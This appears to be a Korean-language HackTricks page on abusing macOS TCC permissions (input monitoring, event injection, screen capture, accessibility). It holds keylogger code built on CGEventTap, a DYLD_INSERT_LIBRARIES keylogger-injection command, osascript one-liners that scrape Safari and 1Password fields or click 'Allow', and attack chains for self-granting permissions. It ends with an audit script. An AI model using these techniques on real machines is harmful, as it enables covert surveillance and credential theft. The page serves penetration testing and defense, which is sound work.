# macOS Input Monitoring, Screen Capture & Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## 개요

서로 관련된 세 가지 TCC 서비스는 애플리케이션이 사용자의 데스크톱 세션을 관찰하고 상호작용하는 방식을 제어합니다.

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | 시스템 전체의 모든 키보드 및 마우스 이벤트 읽기 (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | 합성 키보드 및 마우스 이벤트 주입 |
| `kTCCServiceScreenCapture` | **Screen Capture** | 디스플레이 버퍼 읽기, screenshots 촬영, 화면 기록 |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API를 통해 다른 애플리케이션 제어, UI 요소 읽기 |

이 권한들은 macOS에서 **가장 위험한 조합**입니다. 이 권한을 함께 사용하면 다음이 가능합니다.
- 모든 키 입력에 대한 완전한 keylogging (비밀번호, 메시지, 신용카드 정보)
- 화면에 표시되는 모든 콘텐츠의 화면 기록
- 합성 입력 주입 (버튼 클릭, 대화 상자 승인)
- 물리적 접근과 동등한 완전한 GUI 제어

---

## Input Monitoring (kTCCServiceListenEvent)

### 작동 방식

macOS는 프로세스가 Quartz event system의 입력 이벤트를 가로챌 수 있도록 **`CGEventTap` API**를 사용합니다. ListenEvent 권한이 있는 프로세스는 대상 애플리케이션에 도달하기 전이나 후에 **모든 키보드 및 마우스 이벤트**를 수신하는 event tap을 생성할 수 있습니다.<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### 권한이 부여된 바이너리 찾기
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### 공격: Code Injection을 통한 Keylogging

ListenEvent 권한이 있는 binary에 **disabled library validation**이 적용되어 있거나 **DYLD environment variables**를 허용하는 경우, 공격자는 CGEventTap을 등록하는 dylib를 inject할 수 있습니다:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
주입된 dylib는 대상의 ListenEvent TCC grant를 상속하며 모든 키 입력을 캡처합니다.

### Attack: Credential Harvesting

정교한 keylogger는 키 입력을 활성 애플리케이션과 연관 지을 수 있습니다:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## 입력 주입 (kTCCServicePostEvent)

### 작동 방식

PostEvent 권한을 사용하면 ListenOnly 대신 **`kCGEventTapOptionDefault`**(이벤트를 수정하거나 주입할 수 있음)를 사용해 event tap을 생성할 수 있습니다.<sup>[1]</sup> 이를 통해 다음이 가능합니다:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 공격: Automated TCC Prompt Approval

PostEvent를 사용하면 공격자가 TCC 권한 대화상자에서 **"Allow" 클릭을 시뮬레이션**할 수 있습니다:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## 화면 캡처 (kTCCServiceScreenCapture)

### 작동 방식

화면 캡처 권한이 있으면 다음을 사용해 디스플레이 버퍼를 읽을 수 있습니다.
- **`CGWindowListCreateImage`** — 모든 윈도우 또는 전체 화면 캡처
- **`ScreenCaptureKit`** (macOS 12.3+) — 화면 콘텐츠 스트리밍을 위한 최신 API<sup>[3]</sup>
- **`CGDisplayStream`** — 하드웨어 가속 화면 캡처
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### 화면 캡처 클라이언트 찾기
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### 공격: OCR을 통한 자격 증명 캡처

주입된 screen capture 프로세스는 주기적으로 프레임을 캡처하고 OCR을 사용하여 password를 추출할 수 있습니다:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma**부터 screen capture는 menu bar에 **지속적인 indicator**를 표시합니다. 이전 버전에서는 screen recording이 완전히 조용하게 수행될 수 있었습니다. 그러나 짧은 single-frame capture는 여전히 사용자가 알아차리지 못할 수 있습니다.

### Attack: Session Recording

Continuous screen recording은 사용자의 session을 완전히 replay할 수 있도록 합니다:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## 접근성 (kTCCServiceAccessibility)

### 작동 방식

접근성 접근 권한은 **AXUIElement API**를 통해 다른 애플리케이션을 제어할 수 있도록 합니다.<sup>[2]</sup> 접근성 권한이 있는 프로세스는 다음을 수행할 수 있습니다.

1. 모든 애플리케이션의 UI 요소(텍스트 필드, 레이블, 버튼, 메뉴) **읽기**
2. 버튼 **클릭** 및 컨트롤과 상호 작용
3. 모든 텍스트 필드에 텍스트 **입력**
4. 메뉴 및 대화 상자 **탐색**
5. 실행 중인 모든 애플리케이션에 표시된 데이터 **스크래핑**
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: TCC 권한 자기 부여

가장 위험한 접근성 악용은 **System Settings를 탐색하여 자신의 malware에 추가 권한을 부여하는 것**입니다:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 공격: 애플리케이션 간 데이터 스크래핑
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### 공격: 자동화된 사용자 동작
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 공격 체인

### 체인: Input Monitoring + Screen Capture = 완전한 감시
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = 완전한 원격 제어
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: 접근성 → 카메라/마이크 자체 권한 부여 → 감시
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## 탐지 및 열거
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## 참고 자료

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
